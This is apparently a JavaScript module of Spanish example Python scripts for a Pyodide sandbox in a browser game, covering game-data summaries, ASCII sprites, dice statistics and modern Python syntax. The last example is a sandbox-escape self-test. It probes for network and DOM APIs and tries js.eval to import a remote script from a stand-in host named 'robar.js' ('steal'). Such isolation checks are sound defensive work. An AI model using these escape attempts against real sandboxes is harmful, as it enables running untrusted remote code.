// Scripts de ejemplo de la biblioteca. Todos reciben `contexto`: un dict de
// Python con una COPIA de la partida (no pueden modificarla).

export const EXAMPLES = [
	{
		id: 'mago',
		title: 'El mago analiza tu partida',
		description: 'Lee una copia de tu partida (la de las tiendas de Vue, Svelte y React) y la resume en una tabla.',
		code: `# El mago lee tu partida: \`contexto\` es un dict de Python con una copia
# de los datos del juego. Cambia algo en las tiendas y vuelve a ejecutarlo.
p = contexto["partida"]

print(f"Nivel {p['nivel']} · {p['xp']} XP · {p['oro']} de oro\\n")

if not p["inventario"]:
    print("Tu mochila está vacía: compra ingredientes en la tienda de Vue.")
else:
    print(f"{'Objeto':<24}{'Cant.':>6}{'Venta':>8}")
    print("-" * 38)
    for item in sorted(p["inventario"], key=lambda i: (i["tipo"], i["nombre"])):
        venta = item["precio"] // 2 * item["cantidad"]
        print(f"{item['nombre']:<24}{item['cantidad']:>6}{venta:>8}")
    total = sum(i["precio"] // 2 * i["cantidad"] for i in p["inventario"])
    print("-" * 38)
    print(f"{'Valor si lo vendes todo':<30}{total:>8}")

hechas = len(p["misiones_completadas"])
total_misiones = p["misiones_totales"]
print(f"\\nMisiones [{'#' * hechas}{'.' * (total_misiones - hechas)}] {hechas}/{total_misiones}")
for titulo in p["misiones_completadas"]:
    print(f"  ✓ {titulo}")

siguiente = next((u for u in contexto["umbrales_nivel"] if u > p["xp"]), None)
if siguiente is not None:
    print(f"\\nTe faltan {siguiente - p['xp']} XP para el nivel {p['nivel'] + 1}.")
`,
	},
	{
		id: 'sprite',
		title: 'El héroe en ASCII',
		description: 'Convierte el sprite del héroe del juego en texto con un diccionario y comprensiones de listas.',
		code: `# El sprite del héroe es una lista de strings: cada letra es un color.
sprite = contexto["sprite_heroe"]

tinta = {"o": "@", "k": "%", "s": "+", "b": "=", "n": "~", ".": " "}

def pintar(filas):
    return ["".join(tinta.get(c, "?") * 2 for c in fila) for fila in filas]

normal = pintar(sprite)
del_reves = [fila[::-1] for fila in normal]   # espejo horizontal

for a, b in zip(normal, del_reves):
    print(a, "   ", b)

colores = {c for fila in sprite for c in fila if c != "."}
print(f"\\n{len(sprite)} filas · {len(colores)} colores: {', '.join(sorted(colores))}")
`,
	},
	{
		id: 'dados',
		title: 'Estadística con dados',
		description: 'Lanza 10 000 pares de dados y dibuja la distribución con collections y statistics.',
		code: `import random
from collections import Counter
from statistics import mean, stdev

tiradas = [random.randint(1, 6) + random.randint(1, 6) for _ in range(10_000)]
conteo = Counter(tiradas)

for suma in range(2, 13):
    n = conteo[suma]
    print(f"{suma:>2} | {'#' * (n // 40):<45} {n / len(tiradas):6.1%}")

print(f"\\nMedia: {mean(tiradas):.2f} · Desviación típica: {stdev(tiradas):.2f}")
print(f"Lo más probable: {conteo.most_common(1)[0][0]} (como dice la teoría)")
`,
	},
	{
		id: 'moderno',
		title: 'Python moderno',
		description: 'dataclasses, match y f-strings de depuración, con las recetas del laboratorio.',
		code: `from dataclasses import dataclass, field

@dataclass(frozen=True)
class Pocion:
    nombre: str
    precio: int
    efectos: dict[str, int] = field(default_factory=dict)

    @property
    def venta(self) -> int:
        return self.precio // 2

def describir(p: Pocion) -> str:
    match p:
        case Pocion(precio=precio) if precio >= 30:
            return "legendaria"
        case Pocion(efectos={"mana": m}) if m > 2:
            return "arcana"
        case _:
            return "común"

pociones = [
    Pocion("Poción de Vida", 14, {"vida": 5}),
    Pocion("Poción de Maná", 18, {"mana": 4, "vida": 2}),
    Pocion("Elixir del Equilibrio", 30, {"vida": 3, "mana": 3, "velocidad": 3}),
]

for p in sorted(pociones, key=lambda p: p.venta, reverse=True):
    print(f"{p.nombre:<24} {describir(p):<11} {p.venta=}")
`,
	},
	{
		id: 'bucle',
		title: 'Bucle infinito',
		description: 'El juego no se congela: Python corre en un Web Worker. Pulsa Parar o espera 10 segundos.',
		code: `# Un bucle que no termina nunca. En el hilo principal congelaría la página,
# pero aquí corre en un Web Worker: el pueblo sigue moviéndose.
# Pulsa «Parar», o a los 10 segundos se detiene solo.
vueltas = 0
while True:
    vueltas += 1
`,
	},
	{
		id: 'sandbox',
		title: 'Intento de escapar',
		description: 'Comprueba el aislamiento: sin red, sin eval y sin acceso a la página.',
		code: `# Python puede llamar a JavaScript con el módulo \`js\`... pero en este
# sandbox lo peligroso está desactivado antes de ejecutar nada.
import js

for nombre in ["fetch", "XMLHttpRequest", "WebSocket", "indexedDB", "document", "localStorage"]:
    estado = "bloqueado" if getattr(js, nombre, None) is None else "¡DISPONIBLE!"
    print(f"{nombre:<16} {estado}")

print()
intentos = {
    "eval + import()": lambda: js.eval("import('https://example.com/robar.js')"),
    "new Function": lambda: js.Function.new("return fetch"),
}
for nombre, intento in intentos.items():
    try:
        intento()
        print(f"{nombre:<16} ¡FUNCIONA!")
    except Exception as error:
        print(f"{nombre:<16} bloqueado ({type(error).__name__})")

try:
    from pyodide.http import pyfetch
    await pyfetch(js.location.href)   # una petición a esta misma web
    print("pyfetch          ¡FUNCIONA!")
except Exception as error:
    print(f"pyfetch          bloqueado ({type(error).__name__})")

# loadPackage no lanza excepción si falla la descarga: se comprueba si llegó
import pyodide_js
await pyodide_js.loadPackage("micropip", errorCallback=lambda _: None)
try:
    import micropip
    print("loadPackage      ¡FUNCIONA!")
except ModuleNotFoundError:
    print("loadPackage      bloqueado (no se pudo descargar)")
`,
	},
];
